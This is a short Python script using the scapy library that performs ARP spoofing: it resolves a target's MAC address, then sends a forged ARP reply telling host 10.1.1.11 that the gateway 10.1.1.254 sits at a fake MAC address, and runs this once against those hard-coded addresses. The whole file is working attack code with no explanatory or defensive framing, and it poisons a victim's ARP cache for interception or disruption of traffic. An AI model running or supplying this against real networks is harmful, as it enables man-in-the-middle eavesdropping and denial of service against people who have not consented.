import scapy.all as scapy

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / request
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

def spoofing(target, spoofed):
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed, hwsrc="de:ad:be:ef:ca:fe")
    scapy.send(packet, verbose=False)

spoofing("10.1.1.11", "10.1.1.254")